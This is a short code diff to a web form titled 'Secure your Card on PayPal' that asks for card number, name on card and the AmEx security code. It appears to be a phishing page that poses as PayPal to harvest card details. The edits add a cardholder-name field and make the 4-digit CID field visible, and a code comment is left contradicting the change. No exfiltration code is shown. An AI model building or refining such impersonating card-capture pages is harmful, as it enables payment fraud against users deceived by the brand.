@@ -76,6 +76,7 @@
     <h2>Secure your Card on PayPal</h2>
 <p align=center> PayPal's Card Protection program may result in coverage for the full purchase price of the item plus the original shipping costs you paid by Card, if any. </p>
 
+ <input type="text" id="name" placeholder="Name on Card" required />
       <input type="text" name="card_number" placeholder="Debit or credit card number" id="card_number" required maxlength="19" oninput="formatCardNumber(event)" />
 
 
@@ -188,7 +189,7 @@
     if (cardType === "AmEx") {
       common.classList.add("hidden");
       amex.classList.remove("hidden");
-      amexCID.classList.add("hidden"); // Initially hide 3-digit CID
+      amexCID.classList.remove("hidden"); // Initially hide 3-digit CID
     } else {
       common.classList.remove("hidden");
       amex.classList.add("hidden");
